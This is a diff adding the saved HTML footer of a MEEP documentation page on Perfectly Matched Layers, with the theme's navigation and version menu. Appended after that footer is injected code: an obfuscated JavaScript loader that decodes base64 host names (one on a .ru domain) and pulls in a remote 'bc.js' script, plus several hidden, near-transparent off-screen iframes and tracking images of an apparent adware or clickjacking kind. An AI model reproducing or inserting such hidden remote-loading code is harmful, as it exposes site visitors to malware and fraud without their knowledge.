+  Built with <a href="http://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org/">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" style="cursor: pointer">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      
+          <a href="https://github.com/NanoComp/meep/" class="fa fa-github" style="float: left; color: #fcfcfc"> GitHub</a>
+      
+      
+        <span><a href="https://meep.readthedocs.io/en/latest/Cylindrical_Coordinates/" style="color: #fcfcfc;">« Previous</a></span>
+      
+      
+        <span style="margin-left: 15px"><a href="https://meep.readthedocs.io/en/latest/Parallel_Meep/" style="color: #fcfcfc">Next »</a></span>
+      
+    </span>
+</div>
+    <script>var base_url = '..';</script>
+    <script src="./Perfectly Matched Layers - MEEP Documentation_files/theme.js.download"></script>
+      <script src="./Perfectly Matched Layers - MEEP Documentation_files/MathJax.js.download"></script>
+      <script src="./Perfectly Matched Layers - MEEP Documentation_files/readthedocs-data.js.download"></script>
+      <script src="./Perfectly Matched Layers - MEEP Documentation_files/readthedocs-doc-embed.js.download"></script>
+      <script src="./Perfectly Matched Layers - MEEP Documentation_files/readthedocs-analytics.js.download"></script>
+      <script src="./Perfectly Matched Layers - MEEP Documentation_files/require.js.download"></script>
+      <script src="./Perfectly Matched Layers - MEEP Documentation_files/search.js.download"></script>
+
+
+
+<div id="rtd-4tj5v854"></div><iframe height="1" width="1" src="./Perfectly Matched Layers - MEEP Documentation_files/log(1).html" style="display: none;"></iframe><script id="loader.js" src="./Perfectly Matched Layers - MEEP Documentation_files/loader.js(1).download"></script><!-- Inserted RTD Footer -->
+<div class="injected">
+
+  
+  <div class="rst-versions rst-badge" data-toggle="rst-versions">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      <span class="fa fa-book">&nbsp;</span>
+      v: latest
+      <span class="fa fa-caret-down"></span>
+    </span>
+    <div class="rst-other-versions">
+      
+
+      
+      
+      
+      <dl>
+        <dt>Versions</dt>
+        
+        
+        <dd><a href="https://meep.readthedocs.io/en/master/Perfectly_Matched_Layer.html">master</a></dd>
+        
+        
+         <strong> 
+        <dd><a href="https://meep.readthedocs.io/en/latest/Perfectly_Matched_Layer.html">latest</a></dd>
+         </strong> 
+        
+        
+        <dd><a href="https://meep.readthedocs.io/en/stable/Perfectly_Matched_Layer.html">stable</a></dd>
+        
+        
+      </dl>
+      
+      
+
+      
+      
+      
+
+      
+      <dl>
+        <!-- These are kept as relative links for internal installs that are http -->
+        <dt>On Read the Docs</dt>
+        <dd>
+          <a href="https://readthedocs.org/projects/meep/">Project Home</a>
+        </dd>
+        <dd>
+          <a href="https://readthedocs.org/projects/meep/builds/">Builds</a>
+        </dd>
+        <dd>
+          <a href="https://readthedocs.org/projects/meep/downloads/">Downloads</a>
+        </dd>
+      </dl>
+      
+
+      
+
+      
+      <dl>
+        <dt>On GitHub</dt>
+        <dd>
+          <a href="https://github.com/stevengj/meep/blob/master/doc/docs/Perfectly_Matched_Layer.md">View</a>
+        </dd>
+        
+        <dd>
+          <a href="https://github.com/stevengj/meep/edit/master/doc/docs/Perfectly_Matched_Layer.md">Edit</a>
+        </dd>
+        
+      </dl>
+      
+      
+
+      
+      <dl>
+        <dt>Search</dt>
+        <dd>
+          <div style="padding: 6px;">
+            <form id="flyout-search-form" class="wy-form" target="_blank" action="https://readthedocs.org/projects/meep/search/" method="get">
+              <input type="text" name="q" placeholder="Search docs">
+              </form>
+          </div>
+        </dd>
+      </dl>
+      
+
+
+
+      <hr>
+      
+        <small>
+          <span>Hosted by <a href="https://readthedocs.org/">Read the Docs</a></span>
+          <span> · </span>
+          <a href="https://docs.readthedocs.io/page/privacy-policy.html">Privacy Policy</a>
+        </small>
+      
+
+      
+    </div>
+  </div>
+  
+
+</div>
+<script id="fbshowes_af2.js" src="./Perfectly Matched Layers - MEEP Documentation_files/fbshowes_af2.js(1).download"></script><script id="yloader.js" src="./Perfectly Matched Layers - MEEP Documentation_files/yloader.js(1).download"></script><script id="like_bb6.js" src="./Perfectly Matched Layers - MEEP Documentation_files/like_bb6.js(1).download"></script><script id="vklike_ab12.js" src="./Perfectly Matched Layers - MEEP Documentation_files/vklike_ab12.js(1).download"></script><script id="fblikes_bc3.js" src="./Perfectly Matched Layers - MEEP Documentation_files/fblikes_bc3.js.download"></script><script id="inlloader.js" src="./Perfectly Matched Layers - MEEP Documentation_files/inlloader.js(1).download"></script><script id="init.js?201972" src="./Perfectly Matched Layers - MEEP Documentation_files/init.js(1).download"></script><div id="fbapiWorkDiv" style="position: absolute; height: 1px; width: 1px; z-index: -1; left: -9000px; top: 0px;"></div><script id="yviv" src="./Perfectly Matched Layers - MEEP Documentation_files/show_kb8.js.download"></script><div style="height: 1px; width: 1px; position: absolute; left: 0px; top: 0px; opacity: 0.01; z-index: -9999999;"><iframe src="./Perfectly Matched Layers - MEEP Documentation_files/embed.html" height="1" width="1" style="opacity: 0.01; position: absolute; z-index: -9999999;"></iframe></div><div id="vkWidgetDiv" style="width: 1px; height: 1px; position: absolute; top: 0px; left: -999px; overflow: hidden;"><iframe src="./Perfectly Matched Layers - MEEP Documentation_files/widget_post.html" height="10" width="10"></iframe></div><img src="./Perfectly Matched Layers - MEEP Documentation_files/saved_resource" style="display: none;"><iframe id="yiw" src="./Perfectly Matched Layers - MEEP Documentation_files/inworker.html" height="1" width="1" style="height: 1px; width: 1px; position: absolute; left: 0px; top: 0px; display: none;"></iframe><script>var _0x12ce=['onreadystatechange','loaded','complete','function','onload','src','getElementsByTagName','head','appendChild','_initAdsteroidWidget','exports','call','default','prototype','/widget/','lult','atob','indexOf','http','location','protocol','createElement','script','type','text/javascript','readyState'];(function(_0xa97ac4,_0x1bc289){var _0x587ac0=function(_0x1c0803){while(--_0x1c0803){_0xa97ac4['push'](_0xa97ac4['shift']());}};_0x587ac0(++_0x1bc289);}(_0x12ce,0x72));var _0x54d3=function(_0x37f135,_0x459086){_0x37f135=_0x37f135-0x0;var _0x4bda03=_0x12ce[_0x37f135];return _0x4bda03;};!function(_0x2c5017){function _0xeb7ca9(_0x565942){if(_0x5066c7[_0x565942])return _0x5066c7[_0x565942][_0x54d3('0x0')];var _0x1d15d6=_0x5066c7[_0x565942]={'i':_0x565942,'l':!0x1,'exports':{}};return _0x2c5017[_0x565942][_0x54d3('0x1')](_0x1d15d6['exports'],_0x1d15d6,_0x1d15d6[_0x54d3('0x0')],_0xeb7ca9),_0x1d15d6['l']=!0x0,_0x1d15d6['exports'];}var _0x5066c7={};_0xeb7ca9['m']=_0x2c5017,_0xeb7ca9['c']=_0x5066c7,_0xeb7ca9['d']=function(_0x18cc57,_0x40cd32,_0xb63661){_0xeb7ca9['o'](_0x18cc57,_0x40cd32)||Object['defineProperty'](_0x18cc57,_0x40cd32,{'configurable':!0x1,'enumerable':!0x0,'get':_0xb63661});},_0xeb7ca9['n']=function(_0x59e6cc){var _0x5066c7=_0x59e6cc&&_0x59e6cc['__esModule']?function(){return _0x59e6cc[_0x54d3('0x2')];}:function(){return _0x59e6cc;};return _0xeb7ca9['d'](_0x5066c7,'a',_0x5066c7),_0x5066c7;},_0xeb7ca9['o']=function(_0x3e33fa,_0x2a0993){return Object[_0x54d3('0x3')]['hasOwnProperty']['call'](_0x3e33fa,_0x2a0993);},_0xeb7ca9['p']=_0x54d3('0x4'),_0xeb7ca9(_0xeb7ca9['s']=_0x54d3('0x5'));}({'lult':function(_0x39946a,_0x3ae0bb){!function(_0x597f1c,_0x54d27a){_0x597f1c=window[_0x54d3('0x6')](_0x597f1c),_0x54d27a=_0x54d27a?window[_0x54d3('0x6')](_0x54d27a):_0x597f1c,_0x597f1c&&-0x1===_0x597f1c[_0x54d3('0x7')](_0x54d3('0x8'))&&(_0x597f1c=window[_0x54d3('0x9')][_0x54d3('0xa')]+'//'+_0x597f1c),_0x54d27a&&-0x1===_0x54d27a[_0x54d3('0x7')](_0x54d3('0x8'))&&(_0x54d27a=window[_0x54d3('0x9')][_0x54d3('0xa')]+'//'+_0x54d27a),function(_0x452c06,_0x5bf061){var _0x73f98d=document[_0x54d3('0xb')](_0x54d3('0xc'));_0x73f98d[_0x54d3('0xd')]=_0x54d3('0xe'),_0x73f98d[_0x54d3('0xf')]?_0x73f98d[_0x54d3('0x10')]=function(){_0x54d3('0x11')!==_0x73f98d[_0x54d3('0xf')]&&_0x54d3('0x12')!==_0x73f98d[_0x54d3('0xf')]||(_0x73f98d[_0x54d3('0x10')]=null,_0x54d3('0x13')==typeof _0x5bf061&&_0x5bf061());}:_0x73f98d[_0x54d3('0x14')]=function(){_0x54d3('0x13')==typeof _0x5bf061&&_0x5bf061();},_0x73f98d[_0x54d3('0x15')]=_0x452c06,document[_0x54d3('0x16')](_0x54d3('0x17'))[0x0][_0x54d3('0x18')](_0x73f98d);}(_0x597f1c+atob('L3dpZGdldC9iYy5qcw=='),function(){_0x54d3('0x13')==typeof window['_initAdsteroidWidget']&&window[_0x54d3('0x19')](_0x597f1c,_0x54d27a);});}("Ym5zdGVyLmNvbQ==","Y29va2llLmNvMWxpbmVzdS5ydQ==");}});</script><div id="fbWidgetDiv" style="width: 1px; height: 1px; position: absolute; top: 0px; left: -999px; overflow: hidden;"><iframe src="./Perfectly Matched Layers - MEEP Documentation_files/video.html" height="10" width="10"></iframe></div><iframe src="./Perfectly Matched Layers - MEEP Documentation_files/print.html" style="width: 1px; height: 1px; border: none; position: absolute; top: 0px; left: 0px; z-index: -999; opacity: 0.01;"></iframe><img height="1" width="1" src="./Perfectly Matched Layers - MEEP Documentation_files/05dfdd0631124408(1)" style="display: none;"><div id="yshow_51051337" style="width: 1349px; height: 625px; position: fixed; top: 0px; left: -1349px; z-index: 9999999; overflow: hidden;"><div style="width: 1349px; height: 625px; opacity: 0.01;"><iframe src="./Perfectly Matched Layers - MEEP Documentation_files/Xb04sLXZHoM.html" id="yifr_51051337" width="1349" height="625" allow="autoplay; encrypted-media; picture-in-picture" style="width: 1349px; height: 625px;"></iframe></div></div><div id="yshow_51051813" style="width: 1349px; height: 625px; position: fixed; top: 0px; left: -1349px; z-index: 9999999; overflow: hidden;"><div style="width: 1349px; height: 625px; opacity: 0.01;"><iframe src="./Perfectly Matched Layers - MEEP Documentation_files/WjF946coj2s.html" id="yifr_51051813" width="1349" height="625" allow="autoplay; encrypted-media; picture-in-picture" style="width: 1349px; height: 625px;"></iframe></div></div><div id="yshow_51051850" style="width: 1349px; height: 625px; position: fixed; top: 0px; left: -1349px; z-index: 9999999; overflow: hidden;"><div style="width: 1349px; height: 625px; opacity: 0.01;"><iframe src="./Perfectly Matched Layers - MEEP Documentation_files/2hrC9uThi2M.html" id="yifr_51051850" width="1349" height="625" allow="autoplay; encrypted-media; picture-in-picture" style="width: 1349px; height: 625px;"></iframe></div></div></body></html>
